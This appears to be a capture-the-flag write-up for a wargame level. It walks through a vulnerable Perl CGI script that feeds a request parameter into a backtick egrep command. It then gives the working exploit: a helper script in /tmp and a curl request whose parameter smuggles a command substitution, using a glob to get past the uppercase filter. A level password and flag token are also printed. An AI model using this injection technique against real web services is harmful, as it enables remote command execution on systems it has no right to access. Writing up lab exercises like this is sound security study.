`su level12 -> fa6v5ateaw21peobuub8ipe6s`

We have a perl script again, that is executed by flag12 and runs on port 4646.

```bash
$ cat ./level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

This script takes 2 parameter, x and y:
- x is submitted to 2 transormations, the first to uppercase it, the second one to only keep the fist word (see https://sed.js.org/)
- y is not transformed and just used in the if statement `if($s =~ $nn)`, but doesn't seem exploitable

egrep is like grep but it will interpret the pattern argument.

So we can't pass our `getflag > /tmp/flag` code in x, with `curl localhost:4646/?x="getflag > /tmp/flag"`, as it will become `GETFLAG`.

As `"^$xx"` will get interpreted, we want it to be a script that getflag into a file.

Because we need our script path to match the uppercased x, we replace `/tmp/` with `/*/`, so that it will search our script in all folders and not in `/TMP/`.

```bash
$ echo "getflag > /tmp/flag" > /tmp/XD
$ chmod +x /tmp/XD
$ curl 'localhost:4646?x="`/*/XD`"'
$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

What happens here is that the Perl script will interpret ``egrep "^`/*/XD`" /tmp/test 2>&1``, so it will execute `/tmp/XD`.